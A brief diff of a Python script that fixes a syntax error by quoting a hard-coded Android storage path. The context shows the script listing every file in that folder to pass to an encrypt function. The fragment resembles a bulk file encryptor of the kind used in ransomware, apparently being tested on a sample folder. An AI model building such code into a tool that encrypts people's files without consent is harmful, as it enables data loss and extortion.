@@ -20,7 +20,7 @@ def encrypt(items, key):
 
 if __name__ == '__main__':
 
-    path_to_encrypt = /storage/emulated/0/RAMprueba
+    path_to_encrypt = '/storage/emulated/0/RAMprueba'
     items = os.listdir(path_to_encrypt)
     full_path = [path_to_encrypt+'\\'+item for item in items]
 
